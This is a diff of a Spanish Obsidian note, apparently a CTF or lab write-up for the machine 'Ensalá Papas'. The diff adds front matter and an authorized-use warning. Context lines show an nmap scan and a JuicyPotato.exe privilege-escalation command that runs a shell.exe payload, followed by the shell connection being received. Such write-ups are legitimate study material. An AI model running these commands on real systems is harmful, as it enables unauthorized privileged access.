@@ -1,3 +1,15 @@
+---
+title: "MÁQUINA ENSALÁ PAPAS"
+date: 2026-08-27
+tags:
+  - self-study
+  - security-penetration-testing
+  - avanzado
+status: verified
+author: "Juan José Restrepo Rosero"
+last_updated: 2026-08-27
+---
+
 Hacemos el escaneo de nmap:
 ![[Pasted image 20240809145436.png]]
 Esto corre por el puerto 80:
@@ -80,3 +92,10 @@ JuicyPotato.exe -l 4444 -p shell.exe -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2
 ```
 Y recibimos la conexión:
 ![[Pasted image 20240908125001.png]]
+
+<!-- self-study-knowledge-context -->
+## Contexto de estudio
+- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
+- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
+> [!warning] Uso autorizado
+> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
